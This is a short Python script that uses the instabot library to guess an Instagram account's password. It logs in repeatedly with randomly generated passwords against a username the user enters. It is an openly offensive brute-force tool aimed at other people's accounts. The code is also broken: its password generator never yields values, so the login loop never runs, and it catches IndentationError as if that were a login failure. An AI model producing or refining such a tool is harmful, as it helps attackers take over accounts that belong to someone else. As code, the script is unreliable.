from instabot import Bot
import random
import string

bot = Bot()
username = input("Enter the username : ")

def generate_password(length=8):
    # Define characters to choose from for the password
    characters = string.ascii_letters + string.digits + string.punctuation
    # Generate a random password by selecting characters randomly
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

if __name__ == "__main__":
    password_length = int(input("Enter the length of the password: "))

def gp():
    while True:
        generated_password = generate_password(password_length)
        print(generated_password)

for password in gp():
    try:
        bot.login(username,password)        
        print("password found %s" % password)
        break
    except IndentationError:
        print("password Not Found %s" % password) 